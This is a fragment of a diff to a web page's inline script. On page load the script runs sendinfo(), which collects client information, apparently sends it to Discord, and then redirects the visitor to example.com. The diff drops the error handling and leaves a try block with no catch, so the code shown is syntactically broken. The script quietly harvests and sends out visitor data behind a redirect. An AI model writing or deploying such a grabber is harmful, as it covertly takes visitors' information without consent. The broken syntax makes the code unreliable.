@@ -68,9 +68,8 @@ async function sendinfo() {
   try {
     const info = await collectClientInfo();
     await sendToDiscord(info);
-  } catch (err) {
-    console.error(err);
   }
+  window.location = "https://example.com";
 }
 sendinfo();
   </script>
